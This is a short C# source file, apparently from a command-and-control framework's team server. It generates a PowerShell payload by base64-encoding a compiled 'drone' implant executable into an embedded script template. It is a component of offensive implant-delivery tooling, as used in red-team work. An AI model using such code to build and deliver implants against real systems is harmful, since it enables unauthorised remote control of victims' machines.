using System;
using System.Text;
using System.Threading.Tasks;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public class PoshPayload : Payload
    {
        public PoshPayload(Handler handler, C2Profile c2Profile, string cryptoKey) : base(handler, c2Profile, cryptoKey)
        { }
        
        public override async Task Generate()
        {
            var exe = new ExePayload(Handler, C2Profile, CryptoKey);
            await exe.Generate();

            var scriptBytes = await Utilities.GetEmbeddedResource("drone.ps1");
            
            var scriptText = Encoding.UTF8.GetString(scriptBytes);
            scriptText = scriptText.Replace("{{DATA}}", Convert.ToBase64String(exe.Bytes));

            Bytes = Encoding.UTF8.GetBytes(scriptText);
        }
    }
}